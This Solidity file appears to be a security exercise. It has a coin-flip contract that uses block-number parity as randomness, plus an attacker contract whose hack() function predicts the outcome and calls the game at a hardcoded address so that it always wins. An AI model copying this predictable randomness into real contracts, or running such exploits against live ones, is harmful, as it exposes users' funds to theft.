pragma solidity 0.8.6;


contract Test9 {
    
    mapping(address => uint) public txCount;
    mapping(address => uint) public win;
    
    function gamble(bool _answer) public {
        uint blockNum = block.number;
        bool answer;
        
        if(blockNum % 2 == 1){
            answer = true;
        } else if (blockNum % 2 == 0) {
            answer = false;
        }
        
        txCount[msg.sender]++;
        // txCount[tx.orgin]
        if(answer == _answer){
            win[msg.sender]++;
            // win[tx.origin]
        }
    }
    
}

contract attackTest9 {
    function hack() public {
        uint blockNum = block.number;
        bool answer;
        
        if(blockNum % 2 == 1){
            answer = true;
        } else if (blockNum % 2 == 0) {
            answer = false;
        }
        
        Test9(0x9C22ce44f598cf5616c28a25b3514a1f293B3919).gamble(answer);
    }
}